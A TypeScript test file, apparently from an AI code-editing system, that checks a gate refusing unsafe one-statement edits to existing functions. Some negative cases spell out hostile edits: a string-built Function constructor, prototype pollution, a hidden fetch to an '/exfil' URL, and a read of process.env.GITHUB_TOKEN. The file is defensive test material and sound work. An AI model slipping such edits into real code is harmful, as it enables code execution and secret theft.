// M98 EXISTING_FUNCTION_EDIT (public-existing-function-edit-v1, kind EXISTING_EDIT): G1 replaces ONE statement inside an
// existing named function or class method; G2 writes ONE new test that drives an exported function or a method of
// `new C(..)` with injected, recorded object-literal fakes. The module closure must be hermetic for those calls on the
// base AND the edited source (no clock, local time, env, timers, network, global writes, hidden module state or package
// imports; a capability default passes only when the test injects that key). Job B re-checks all of it on the graded
// tree, runs the after-tree in three zone + locale pairs, and needs the base to fail by assertion failures only.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { admitRules } from "../lib/approved.ts";
import { applyRule, RULE_KINDS, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
import { analyzeSuppliedEdit, codeTokens, deriveExistingEditDetail, editConfinedTarget, editStatement, existingEditDetail, EXISTING_EDIT_DERIVER, EXISTING_EDIT_SPLICE_DISABLED, isExcludedSource, EXISTING_EDIT_ENV_RUNS, EXISTING_EDIT_TRIGGER, EXISTING_EDIT_VOCAB, existingEditReads, gradedTestCalls, gradeExistingEditProblem, hasComment, hermeticProblem, newGrammarProblem, parseStatements, splitBody, type CallShape } from "../lib/learned-edit-existing.ts";
import { readManifestBytes } from "../lib/manifestparts.ts";
import { LEARNED_CANONICAL } from "../lib/nlparse.ts";
import { phrasingFor } from "../lib/propose.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";

const root = resolve(import.meta.dirname, "../..");
const read = (p: string) => readFileSync(resolve(root, p), "utf8");
const SPEC = JSON.parse(read("peaceai/rules/learned/public-existing-function-edit-v1.json")) as RuleSpec;
const SHA = "8c7483ccd04dc9ab10b2946c15df0617493253cd3e3542b54c1ac289fc7dc815";

const STORAGE = [
  "export interface Client { list(prefix: string): Promise<string[]>; get(key: string): Promise<Uint8Array | null>; head(key: string): Promise<{ size: number } | null> }",
  "export class Storage {",
  "  constructor(private readonly client: Client) {}",
  "  async measure(): Promise<{ total: number; count: number }> {",
  "    const keys = await this.client.list(\"cache/\");",
  "    let total = 0;",
  "    for (const key of keys) {",
  "      const size = (await this.client.get(key))?.byteLength ?? 0;",
  "      total += size;",
  "    }",
  "    return { total, count: keys.length };",
  "  }",
  "  async keys(): Promise<string[]> {",
  "    return this.client.list(\"cache/\");",
  "  }",
  "}",
  "",
].join("\n");
const API = [
  "export interface Config { base: string; fetchImpl?: (url: string) => Promise<Response>; now?: () => Date }",
  "export class Api {",
  "  private readonly base: string;",
  "  private readonly fetchImpl: (url: string) => Promise<Response>;",
  "  private readonly now: () => Date;",
  "  constructor(config: Config) {",
  "    this.base = config.base;",
  "    this.fetchImpl = config.fetchImpl ?? fetch;",
  "    this.now = config.now ?? (() => new Date());",
  "  }",
  "  async request(url: string): Promise<Response> {",
  "    return this.fetchImpl(url);",
  "  }",
  "  async get(path: string): Promise<string> {",
  "    const response = await this.request(this.base + path);",
  "    if (!response.ok) throw new Error(\"HTTP_\" + response.status);",
  "    return response.text();",
  "  }",
  "}",
  "",
].join("\n");
const MISC = [
  "let calls = 0;",
  "const LIMIT = 3;",
  "export interface Dep { load(id: string): Promise<number> }",
  "export async function total(dep: Dep, ids: readonly string[]): Promise<number> {",
  "  let sum = 0;",
  "  for (const id of ids) {",
  "    sum += await dep.load(id);",
  "    sum += await dep.load(id);",
  "  }",
  "  const twice = ids.map((id) => { const n = id.length; return n; });",
  "  return sum + twice.length;",
  "}",
  "export async function counted(dep: Dep): Promise<number> {",
  "  return dep.load(calls > 0 ? \"b\" : \"a\");",
  "}",
  "export async function bumped(dep: Dep): Promise<number> {",
  "  calls += 1;",
  "  return dep.load(\"a\");",
  "}",
  "export async function capped(dep: Dep): Promise<number> {",
  "  const n = await dep.load(\"a\");",
  "  return Math.min(n, LIMIT);",
  "}",
  "export function other(x: number): number {",
  "  return x + 1;",
  "}",
  "class Hidden {",
  "  constructor(private readonly dep: Dep) {}",
  "  async run(): Promise<number> {",
  "    return this.dep.load(\"a\");",
  "  }",
  "}",
  "export const keep = Hidden;",
  "",
].join("\n");
const FILES = [{ path: "src/storage.ts", content: STORAGE }, { path: "src/api.ts", content: API }, { path: "src/misc.ts", content: MISC }];
const isTest = (p: string) => /\.test\.ts$/.test(p);
// Auditor #489 hole 4: the production entry (applyRule -> existingEditDetail) refuses every splice with
// edit_splice_disabled. The gate proofs below therefore run the SUPPLIED edit through analyzeSuppliedEdit (gates only,
// never an entry point; a future DERIVE_FROM_BEHAVIOR edit must pass the same gates), with applyRule's public reason form.
const whyForm = (code: string): string => { const i = code.indexOf(":"); if (i < 0) return code; const n = code.slice(i + 1); return /^[A-Za-z_$][\w$]{0,63}$/.test(n) ? `${code.slice(0, i)}: ${n}` : code.slice(0, i); };
const run = (objective: string, files = FILES, exists: (p: string) => boolean = () => false) => {
  const d = analyzeSuppliedEdit(SPEC.trigger, SPEC.params as Record<string, string>, objective, files, isTest);
  if (!d.edit) return { e: null, r: whyForm(d.reason ?? "edit_refused") };
  if (d.edit.extra.some((x) => exists(x.path))) return { e: null, r: "new_test_path_exists" };
  return { e: d.edit as { path: string; content: string; extra: { path: string; content: string }[]; selfGrade?: boolean }, r: undefined };
};
const prod = (objective: string, files = FILES) => {
  const w: { reason?: string } = {};
  const e = applyRule(SPEC, objective, files, isTest, undefined, w, () => false);
  return { e, r: w.reason };
};
const B = [
  "in Storage.measure in src/storage.ts: replace statement const size = (await this.client.get(key))?.byteLength ?? 0; with const size = (await this.client.head(key))?.size ?? 0;",
  "- fake client = { list: resolves([\"cache/a\", \"cache/b\"]), get: resolves(bytes(\"hello\")), head: resolves({ size: 7 }) }",
  "- expect new Storage(client).measure() resolves to { total: 14, count: 2 }",
  "- expect client.get is called 0 times",
  "- expect client.head is called 2 times",
].join("\n");
const RETRY = "for (const attempt of [1, 2, 3]) { try { const response = await this.fetchImpl(url); if (response.status < 500 || attempt === 3) return response; } catch (error) { if (attempt === 3) throw error; } } throw new Error(\"RETRY_EXHAUSTED\");";
const SEQ = "fetchImpl: sequence(resolves(response(503)), rejects(\"socket hang up\"), resolves(response(200, \"hi\"))), now: returns(date(\"2026-01-02T03:04:05Z\"))";
const C = (fakes = SEQ, nw = RETRY, extra = "- expect config.fetchImpl is called 3 times") => [
  `in Api.request in src/api.ts: replace statement return this.fetchImpl(url); with ${nw}`,
  `- fake config = { base: "https://x.test/", ${fakes} }`,
  "- expect new Api(config).get(\"a\") resolves to \"hi\"",
  ...(extra ? [extra] : []),
].join("\n");
const M = (head: string, bullets: string[] = ["- fake dep = { load: resolves(2) }", "- expect total(dep, [\"a\"]) resolves to 5"]) => [head, ...bullets].join("\n");

test("spec: valid, hash-pinned, one value per param, kind and trigger wired; protected; a listed approval entry pins the exact hash", () => {
  assert.ok(validateSpec(SPEC));
  assert.equal(specHash(SPEC), SHA);
  assert.equal(SPEC.kind, "EXISTING_EDIT");
  assert.ok((RULE_KINDS as readonly string[]).includes("EXISTING_EDIT"));
  assert.equal(SPEC.trigger, EXISTING_EDIT_TRIGGER);
  assert.equal(LEARNED_CANONICAL.existingEdit.kind, "EXISTING_EDIT");
  assert.equal(LEARNED_CANONICAL.existingEdit.re.source, new RegExp(EXISTING_EDIT_TRIGGER, "imu").source);
  for (const [k, v] of Object.entries(EXISTING_EDIT_VOCAB)) {
    assert.equal(v.length, 1, k);
    assert.equal(SPEC.params[k], v[0], k);
    assert.ok(!validateSpec({ ...SPEC, params: { ...SPEC.params, [k]: `${v[0]}-wider` } }), `${k} cannot widen`);
  }
  assert.ok(!validateSpec({ ...SPEC, minedFrom: "core", id: "core-existing-function-edit-v1" }));
  assert.ok(!validateSpec({ ...SPEC, params: { ...SPEC.params, extra: "x" } }));
  // Lesson (M85+): never assert the rule is absent from approved.json; any listed entry must pin this exact hash.
  const onMain = JSON.parse(read("peaceai/rules/approved.json")) as { rules: { id: string; sha256: string }[] };
  for (const r of onMain.rules.filter((x) => x.id === SPEC.id)) assert.equal(r.sha256, SHA);
  const list = (sha: string) => ({ ok: true as const, list: { schema: "peaceai-approved-rules:v1", rules: [{ id: SPEC.id, sha256: sha, source: "workspace" }] } as never });
  assert.equal(admitRules([SPEC], list(SHA))[0]!.decision, "APPROVED");
  assert.equal(admitRules([SPEC], list("0".repeat(64)))[0]!.decision, "HASH_CHANGED");
  assert.match(phrasingFor(SPEC), /^DISABLED \(Auditor #489 hole 4.*DERIVE_FROM_BEHAVIOR/);
  for (const p of ["peaceai/lib/learned-edit-existing.ts", "peaceai/spec/existing-function-edit-v1.md", "peaceai/test/m98-existing-function-edit.test.ts", "peaceai/rules/proposals/m98-existing-function-edit-evidence.json", "peaceai/test/fixtures/m98-ee/x.txt", "peaceai/rules/learned/public-existing-function-edit-v1.json", "peaceai/rules/proposals/public-existing-function-edit-v1.json"])
    assert.ok(PROTECTED_SELF.some((x) => x.pattern.test(p)), p);
});

test("Auditor #489 hole 4: the splice trigger is disabled — no task (fix B/C shapes, R1-R3b, plain edits) is accepted; the derive hook is pending", () => {
  assert.equal(EXISTING_EDIT_SPLICE_DISABLED, true);
  assert.equal(EXISTING_EDIT_DERIVER, null);
  const R1 = "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.__m98_pwned = typeof process\")(); return n + 2;\n- expect f(1) returns 3";
  const plain = M("in total in src/misc.ts: replace statement return sum + twice.length; with return sum + twice.length + 1;");
  for (const obj of [B, C(), R1, plain]) {
    const p = prod(obj, [...FILES, { path: "src/m1.ts", content: "export function f(n: number): number {\n  return n + 1;\n}\n" }]);
    assert.equal(p.e, null);
    assert.equal(p.r, "edit_splice_disabled");
    assert.equal(existingEditDetail(SPEC.trigger, SPEC.params as Record<string, string>, obj, FILES, isTest).reason, "edit_splice_disabled");
  }
  // the same B task IS a well-formed edit for the gates: the refusal is the credit rule, not an accident of parsing
  assert.ok(run(B).e);
  assert.equal(prod(B + "\n" + B.split("\n")[0]).r, "edit_trigger");
  assert.equal(deriveExistingEditDetail({ file: "src/storage.ts", target: "Storage.measure", behavior: "count bytes with head()", bullets: B.split("\n").slice(1) }, FILES, isTest).reason, "edit_derive_pending");
});

test("approved rules unchanged: every approved.json entry still hash-matches a valid spec file", () => {
  const onMain = JSON.parse(read("peaceai/rules/approved.json")) as { rules: { id: string; sha256: string }[] };
  const dir = resolve(root, "peaceai/rules/learned");
  const byId = new Map(readdirSync(dir).filter((f) => f.endsWith(".json")).map((f) => { const s = JSON.parse(readFileSync(join(dir, f), "utf8")) as RuleSpec; return [s.id, s] as const; }));
  assert.ok(onMain.rules.length >= 30);
  for (const r of onMain.rules) {
    const s = byId.get(r.id);
    if (!s) continue; // core / workflow entries live elsewhere
    assert.ok(validateSpec(s), r.id);
    assert.equal(specHash(s), r.sha256, r.id);
  }
});

test("G1+G2 positive (fix B shape): one statement swapped inside an async class method, one new fake-driven test", () => {
  const { e, r } = run(B);
  assert.equal(r, undefined);
  assert.ok(e && e.selfGrade);
  assert.equal(e.path, "src/storage.ts");
  assert.equal(e.content, STORAGE.replace("const size = (await this.client.get(key))?.byteLength ?? 0;", "const size = (await this.client.head(key))?.size ?? 0;"));
  assert.equal(e.extra.length, 1);
  assert.match(e.extra[0]!.path, /^src\/storage\.storage-measure-[0-9a-f]{7}\.test\.ts$/);
  const t = e.extra[0]!.content;
  assert.match(t, /^import assert from "node:assert\/strict";\nimport test from "node:test";\nimport \{ Storage \} from "\.\/storage(?:\.ts)?";\n/);
  assert.match(t, /assert\.deepEqual\(await settle\(\(\) => new Storage\(client as never\)\.measure\(\)\), \{ ok: true, value: \{ total: 14, count: 2 \} \}\);/);
  assert.match(t, /assert\.equal\(client\.get\.calls\.length, 0\);/);
  assert.match(t, /assert\.equal\(client\.head\.calls\.length, 2\);/);
  assert.ok(!/Date|process|setTimeout|globalThis|Math\.random/.test(t.replace(/\/\/[^\n]*/g, "")), "the harness itself reads no clock, env, timer or global");
  // Job B re-checks the graded tree: confined to the one method, the test re-read in the emitted language
  assert.equal(editConfinedTarget("src/storage.ts", STORAGE, e.content), "Storage.measure");
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, e.content, e.extra[0]!.path, t, rd), null);
  assert.deepEqual(existingEditReads("src/storage.ts", rd), ["src/storage.ts"]);
});

test("G1+G2 positive (fix C shape): immediate bounded retry; the capability defaults pass only because the test injects them", () => {
  const { e, r } = run(C());
  assert.equal(r, undefined);
  assert.ok(e);
  assert.ok(e.content.includes("for (const attempt of [1, 2, 3]) {"));
  assert.match(e.extra[0]!.content, /fetchImpl: fakeFn\(\[\{ kind: "resolves", value: \(\) => \(new Response\(null, \{ status: 503 \}\)\) \}/);
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  assert.equal(gradeExistingEditProblem("src/api.ts", API, e.content, e.extra[0]!.path, e.extra[0]!.content, rd), null);
  // not injected: the default is walked like any other code and refused
  assert.equal(run(C("now: returns(date(\"2026-01-02T03:04:05Z\"))", RETRY, "")).r, "edit_io_global: fetch");
  assert.equal(run(C(SEQ.replace(/, now: .*$/, ""))).r, "edit_io_global: Date");
});

test("G1+G2 really run: the emitted test passes on the edit in every zone + locale pair and fails by assertion on the base", () => {
  const { e } = run(B);
  assert.ok(e);
  const dir = mkdtempSync(join(tmpdir(), "m98-"));
  try {
    const write = (p: string, c: string) => { mkdirSync(dirname(join(dir, p)), { recursive: true }); writeFileSync(join(dir, p), c); };
    write(e.extra[0]!.path, e.extra[0]!.content);
    const go = (src: string, env: Record<string, string>) => {
      write("src/storage.ts", src);
      try { execFileSync(process.execPath, ["--import", "tsx", "--test", join(dir, e.extra[0]!.path)], { cwd: root, env: { PATH: process.env.PATH ?? "", ...env }, stdio: "pipe" }); return { ok: true, out: "" }; }
      catch (x) { return { ok: false, out: String((x as { stdout?: Buffer }).stdout ?? "") }; }
    };
    assert.equal(EXISTING_EDIT_ENV_RUNS.length, 3);
    for (const env of EXISTING_EDIT_ENV_RUNS) assert.ok(go(e.content, { ...env }).ok, JSON.stringify(env));
    const before = go(STORAGE, { ...EXISTING_EDIT_ENV_RUNS[0]! });
    assert.ok(!before.ok);
    assert.match(before.out, /ERR_ASSERTION/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("negatives: NEW reading the clock, env, timers, randomness or local time, writing globals, or using templates is refused", () => {
  const want: [string, string][] = [
    ["if (Date.now() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_not_allowlisted"],
    ["if (process.env.X) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_new_capability"],
    ["setTimeout(() => 1, 1); return this.fetchImpl(url);", "edit_new_capability"],
    ["globalThis.x = 1; return this.fetchImpl(url);", "edit_new_capability"],
    ["if (Math.random() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_not_allowlisted"],
    ["if (new Date(0).getHours() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_not_allowlisted"],
    ["return this.fetchImpl(`${url}`);", "edit_new_grammar"],
    ["delete this.base; return this.fetchImpl(url);", "edit_new_grammar"],
    ["function f() { return 1; } return this.fetchImpl(url);", "edit_new_grammar"],
    ["while (true) { break; } return this.fetchImpl(url);", "edit_new_grammar"],
    ["const a = 1; const b = 2; const c = 3; const d = 4; return this.fetchImpl(url);", "edit_split"],
  ];
  for (const [nw, r] of want) assert.equal(run(C(SEQ, nw)).r, r, nw);
  // with a comment, NEW does not parse as one line of code
  assert.equal(run(C(SEQ, "return this.fetchImpl(url); // retry later")).r, "edit_split");
  assert.ok(!hasComment("return \"https://x.test/\";") && hasComment("return 1; /* x */") && hasComment("f(a // b"));
});

test("negatives: site, split, entry, reach, hidden state, test grammar, reflection strings, paths, existing test path", () => {
  // OLD occurs twice among the target's own statements
  assert.equal(run(M("in total in src/misc.ts: replace statement sum += await dep.load(id); with sum += 2 * (await dep.load(id));")).r, "edit_site");
  // OLD only inside a nested function (the arrow): never a site
  assert.equal(run(M("in total in src/misc.ts: replace statement const n = id.length; with const n = id.length + 1;")).r, "edit_site");
  // the target must exist as a named function / non-static method
  assert.equal(run(M("in nope in src/misc.ts: replace statement return x + 1; with return x + 2;")).r, "edit_site");
  // two parse-valid splits at " with "
  assert.equal(run(M("in other in src/misc.ts: replace statement return x + 1; with return x + 2; with return x + 3;")).r, "edit_split");
  // module let state reached by the entry
  assert.equal(run(M("in counted in src/misc.ts: replace statement return dep.load(calls > 0 ? \"b\" : \"a\"); with return dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect counted(dep) resolves to 2"])).r, "edit_hidden_state");
  // a write to a module binding is a global write
  assert.equal(run(M("in bumped in src/misc.ts: replace statement return dep.load(\"a\"); with return dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect bumped(dep) resolves to 2"])).r, "edit_global_write");
  // module const data read-only is fine
  assert.equal(run(M("in capped in src/misc.ts: replace statement return Math.min(n, LIMIT); with return Math.min(n, LIMIT - 1);", ["- fake dep = { load: resolves(9) }", "- expect capped(dep) resolves to 2"])).r, undefined);
  // the class is not exported (only aliased): not an entry
  assert.equal(run(M("in Hidden.run in src/misc.ts: replace statement return this.dep.load(\"a\"); with return this.dep.load(\"b\");", ["- fake dep = { load: resolves(2) }", "- expect new Hidden(dep).run() resolves to 2"])).r, "edit_entry_not_exported");
  // the test never reaches the edited method
  assert.equal(run([B.split("\n")[0]!, "- fake client = { list: resolves([]) }", "- expect new Storage(client).keys() resolves to []"].join("\n")).r, "edit_test_unreached");
  // bad / stray bullets
  assert.equal(run(B + "\n- expect client.list is 3").r, "edit_test_grammar");
  assert.equal(run(B + "\n- client.head is called 2 times").r, "edit_test_grammar");
  assert.equal(run(B.replace("bytes(\"hello\")", "Date.now()")).r, "edit_test_grammar");
  // reflection names as test strings
  assert.equal(run(B.replace("\"cache/a\"", "\"constructor\"")).r, "edit_test_grammar");
  assert.equal(run(B.replace("\"cache/a\"", "\"__proto__\"")).r, "edit_test_grammar");
  // paths
  assert.equal(run(B, [...FILES, { path: "src/storage.test.ts", content: "" }].map((f) => f.path === "src/storage.ts" ? { path: "src/storage.test.ts", content: STORAGE } : f)).r, "edit_path");
  assert.equal(run(B.replace("src/storage.ts", "peaceai/lib/x.ts")).r, "edit_trigger");
  // the new test path already exists in the full checkout
  assert.equal(run(B, FILES, (p) => /^src\/storage\.storage-measure-/.test(p)).r, "new_test_path_exists");
  // two trigger lines
  assert.equal(run(B + "\n" + B.split("\n")[0]).r, "edit_trigger");
});

test("Auditor #489: no splice may add a capability the base lacked — Function ctor, prototype pollution, hidden I/O defaults (Job A + Job B)", () => {
  // Job A: every Auditor repro is refused at the task-text gate; the control (direct global I/O) stays refused.
  const detail = (file: string, obj: string) => analyzeSuppliedEdit(SPEC.trigger, SPEC.params, obj, [{ path: file, content: REPRO[file]! }], isTest).reason;
  const REPRO: Record<string, string> = {
    "src/m1.ts": "export function f(n: number): number {\n  return n + 1;\n}\n",
    "src/m2.ts": "export interface Deps { load: (k: string) => Promise<string>; fetchImpl?: typeof fetch }\nexport async function g(deps: Deps): Promise<string> {\n  return await deps.load(\"a\");\n}\n",
    "src/m3.ts": "export interface Opts { token?: string }\nexport function h(o: Opts): string {\n  return \"x\";\n}\n",
  };
  // R1: build the Function constructor via a string-built "constructor" key behind `as any`
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.x = 1\")(); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:computed");
  // R2: Object.prototype pollution through a computed write on a non-identifier root behind `as any`
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"__pro\", \"to__\"].join(\"\"); ({} as any)[k].polluted = \"yes\"; return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:computed");
  // R3: new network I/O hidden behind an injected `?? fetch` default
  assert.equal(detail("src/m2.ts", "in g in src/m2.ts: replace statement return await deps.load(\"a\"); with const send = deps.fetchImpl ?? fetch; await send(\"https://example.invalid/exfil\"); return (await deps.load(\"b\")) + \"!\";\n- fake deps = { load: resolves(\"v\"), fetchImpl: resolves(1) }\n- expect g(deps) resolves to \"v!\""), "edit_new_capability:id:fetch");
  // R3b: process.env read hidden behind an injected `?? process.env.X` default
  assert.equal(detail("src/m3.ts", "in h in src/m3.ts: replace statement return \"x\"; with const t = o.token ?? process.env.GITHUB_TOKEN; return \"y\" + (t ? \"\" : \"\");\n- expect h({ token: \"t\" }) returns \"y\""), "edit_new_capability:id:process");
  // N1 control: a bare global stays refused
  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with void fetch(\"https://x\"); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:id:fetch");

  // Job B: the same gate on the graded tree (base vs edited target), independent of the task text or the test content.
  const { e } = run(B);
  assert.ok(e);
  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
  const evilFetch = STORAGE.replace("return { total, count: keys.length };", "void fetch(\"https://x\"); return { total, count: keys.length };");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilFetch, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:id:fetch");
  const evilCast = STORAGE.replace("return { total, count: keys.length };", "const z = (keys as any)[\"length\"]; return { total, count: keys.length };");
  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilCast, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:cast:any");

  // Counted, not just present: a base that already has one `?? fetch` default can't gain a second (hidden exfil).
  const HAS = "export interface D { load: (k: string) => Promise<string>; f?: typeof fetch }\nexport async function g(d: D): Promise<string> {\n  const s = d.f ?? fetch;\n  return await d.load(\"a\");\n}\n";
  assert.equal(analyzeSuppliedEdit(SPEC.trigger, SPEC.params, "in g in src/h.ts: replace statement return await d.load(\"a\"); with const t = d.f ?? fetch; await t(\"https://example.invalid/x\"); return await d.load(\"b\");\n- fake d = { load: resolves(\"v\"), f: resolves(1) }\n- expect g(d) resolves to \"v\"", [{ path: "src/h.ts", content: HAS }], isTest).reason, "edit_new_capability:id:fetch");

  // Cast-free prototype paths: a dynamic computed key is only allowed as param[param]; string-built keys on a local or a
  // parameter receiver are refused, literal non-reflection keys and plain edits still pass.
  const F1 = [{ path: "src/m.ts", content: "export function f(n: number, o: { a: number }): number {\n  return n + 1;\n}\n" }];
  const ed = (nw: string) => analyzeSuppliedEdit(SPEC.trigger, SPEC.params, `in f in src/m.ts: replace statement return n + 1; with ${nw}\n- expect f(1, { a: 1 }) returns 3`, F1, isTest).reason;
  assert.equal(ed(`const q = {}; const k = ["__pro", "to__"].join(""); q[k].polluted = 1; return n + 2;`), "edit_new_capability:computed");
  assert.equal(ed(`const k = ["__pro", "to__"].join(""); const p = o[k]; p.z = 1; return n + 2;`), "edit_new_capability:computed");
  assert.equal(ed(`const H = f["constr" + "uctor"]; return n + 2;`), "edit_new_capability:computed");
  assert.equal(ed(`const q = { a: n }; return q["a"] + 2;`), null);
  // ... and through destructuring / object-literal keys (no member access at all)
  assert.equal(ed(`const { constructor: C } = f; C("globalThis.x = 1")(); return n + 2;`), "edit_new_capability:refl:constructor");
  assert.equal(ed(`const { constructor } = o; return n + 2;`), "edit_new_capability:refl:constructor");
  assert.equal(ed(`const { ["constr" + "uctor"]: C } = o as never; return n + 2;`), "edit_new_capability:computed");
  assert.equal(ed(`const z = { __proto__: o }; return n + 2;`), "edit_new_capability:refl:__proto__");
  assert.equal(ed(`const { a } = o; return n + a + 1;`), null);

  // Engine excludes test helpers and fixtures as edit targets, no matter what targets.json denyPatterns say.
  assert.equal(analyzeSuppliedEdit(SPEC.trigger, SPEC.params, "in f in src/x.test-helper.ts: replace statement return 1; with return 2;\n- expect f() returns 2", [{ path: "src/x.test-helper.ts", content: "export function f(): number {\n  return 1;\n}\n" }], isTest).reason, "edit_path");
  assert.equal(analyzeSuppliedEdit(SPEC.trigger, SPEC.params, "in f in src/fixtures/x.ts: replace statement return 1; with return 2;\n- expect f() returns 2", [{ path: "src/fixtures/x.ts", content: "export function f(): number {\n  return 1;\n}\n" }], isTest).reason, "edit_path");
  assert.ok(isExcludedSource("src/a.test-helper.ts") && isExcludedSource("src/__mocks__/a.ts") && isExcludedSource("src/fixtures/a.ts") && !isExcludedSource("src/a.ts"));
});

test("Auditor #489 (G2): mutable static/module state and timers in reached code stay refused; the emitted test awaits every call", () => {
  const d = (file: string, content: string, obj: string) => analyzeSuppliedEdit(SPEC.trigger, SPEC.params, obj, [{ path: file, content }], isTest).reason;
  // static mutable class state read + written by the tested method (shared across calls) is hidden state
  const STAT = "export class Counter {\n  static n = 0;\n  bump(): number {\n    return 1;\n  }\n}\n";
  assert.equal(d("src/s.ts", STAT, "in Counter.bump in src/s.ts: replace statement return 1; with Counter.n += 1; return Counter.n;\n- expect new Counter().bump() returns 1"), "edit_not_allowlisted:write-nonfresh");
  // a timer introduced by the edit
  const TMR = "export function f(n: number): number {\n  return n;\n}\n";
  assert.equal(d("src/t.ts", TMR, "in f in src/t.ts: replace statement return n; with setInterval(() => 1, 1); return n;\n- expect f(1) returns 1"), "edit_new_capability:id:setInterval");
  // the emitted G2 test wraps every call in settle/settleSync, so no promise is ever left unawaited
  const { e } = run(B);
  assert.ok(e);
  const body = e.extra[0]!.content;
  for (const line of body.split("\n").filter((l) => /new Storage\(|\bmeasure\(/.test(l))) assert.match(line, /(?:await settle|settleSync)\(\(\) =>/);
  // ... and the EDIT may not leave a collaborator promise un-awaited (Job A and Job B share capabilityDelta)
  const ASY = "export interface D { load: (k: string) => Promise<string>; save: (k: string) => Promise<void> }\nexport async function g(d: D): Promise<string> {\n  return await d.load(\"a\");\n}\n";
  const ga = (nw: string) => d("src/g.ts", ASY, `in g in src/g.ts: replace statement return await d.load("a"); with ${nw}\n- fake d = { load: resolves("v"), save: resolves(1) }\n- expect g(d) resolves to "v"`);
  assert.equal(ga(`d.save("x"); return await d.load("a");`), "edit_unawaited:call");
  assert.equal(ga(`void d.save("x"); return await d.load("a");`), "edit_unawaited:void");
  assert.equal(ga(`d.save("x").then(() => 1); return await d.load("a");`), "edit_unawaited:then");
  assert.equal(ga(`await new Promise((r) => r(1)); return await d.load("a");`), "edit_unawaited:new-promise");
  assert.equal(ga(`["x"].forEach((k) => d.save(k)); return await d.load("a");`), "edit_unawaited:callback");
  assert.equal(ga(`await d.save("x"); return await d.load("a");`), null);
  assert.equal(ga(`await Promise.all(["x"].map((k) => d.save(k))); return await d.load("a");`), null);
  const evilFloat = ASY.replace("return await d.load(\"a\");", "d.save(\"x\"); return await d.load(\"a\");");
  const jb = gradeExistingEditProblem("src/g.ts", ASY, evilFloat, "src/g.x.test.ts", "", () => null);
  assert.equal(jb, "edit_unawaited:call");
});

test("negatives: the closure is hermetic or nothing (package imports, builtins, load-time IO, extends)", () => {
  const head = "in Storage.measure in src/storage.ts: replace statement const size = (await this.client.get(key))?.byteLength ?? 0; with const size = (await this.client.head(key))?.size ?? 0;";
  const bul = B.split("\n").slice(1).join("\n");
  const withPrelude = (pre: string, extraFiles: { path: string; content: string }[] = []) => run(`${head}\n${bul}`, [{ path: "src/storage.ts", content: pre + STORAGE }, ...extraFiles]).r;
  assert.equal(withPrelude("import { z } from \"zod\";\nexport const S = z;\n"), "edit_package_import: zod");
  assert.equal(withPrelude("import { readFileSync } from \"node:fs\";\nexport const R = readFileSync;\n"), "edit_io_import");
  assert.equal(withPrelude("const T = Date.now();\nexport const t = T;\n"), "edit_io_global: Date");
  assert.equal(withPrelude("import { x } from \"./dep.ts\";\nexport const y = x;\n", [{ path: "src/dep.ts", content: "export const x = process.env.HOME;\n" }]), "edit_io_global: process");
  assert.equal(withPrelude("import { x } from \"./dep.ts\";\nexport const y = x;\n", [{ path: "src/dep.ts", content: "export const x = 1;\n" }]), undefined);
  // Auditor #520: the hermetic walk is shallow (it never enters a function), so an initializer that calls one, or makes
  // the runtime call user code, is refused by the strict inert-at-load allowlist (here and in any imported module)
  for (const pre of [
    "export const a = (() => fetch(\"x\"))();\n",
    "export const a = (() => { (globalThis as any).x = 1; return 1; })();\n",
    "export const a = console.log(1);\n",
    "const tag = (s: TemplateStringsArray) => s[0];\nexport const a = tag`x`;\n",
    "const o = { get g() { return 1; } };\nexport const a = o.g;\n",
    "const o = { toString() { return \"x\"; } };\nexport const a = `${o}`;\n",
    "const o = [1];\nexport const a = [...o];\n",
  ]) assert.equal(withPrelude(pre), "edit_module_load", pre);
  assert.equal(withPrelude("import { x } from \"./dep.ts\";\nexport const y = x;\n", [{ path: "src/dep.ts", content: "export const x = (() => { console.log(1); return 1; })();\n" }]), "edit_module_load");
  const ext = STORAGE.replace("export class Storage {", "class Base {}\nexport class Storage extends Base {");
  assert.equal(run(B, [{ path: "src/storage.ts", content: ext }]).r, "edit_class_extends");
});

test("Job B shape: only the exact emitted header, harness and bullet language re-parse; confinement is one unit", () => {
  const { e } = run(B);
  assert.ok(e);
  const t = e.extra[0]!.content, p = e.extra[0]!.path;
  const calls = gradedTestCalls(p, t, "src/storage.ts") as CallShape[];
  assert.equal(calls.length, 1);
  assert.equal(calls[0]!.entry.kind, "new");
  for (const bad of [
    t.replace("import test from \"node:test\";", "import test from \"node:test\";\nimport { readFileSync } from \"node:fs\";"),
    t.replace("assert.equal(client.head.calls.length, 2);", "assert.equal(client.head.calls.length, 2);\nprocess.env.X = \"1\";"),
    t.replace("function fakeFn", "function fakeFn2"),
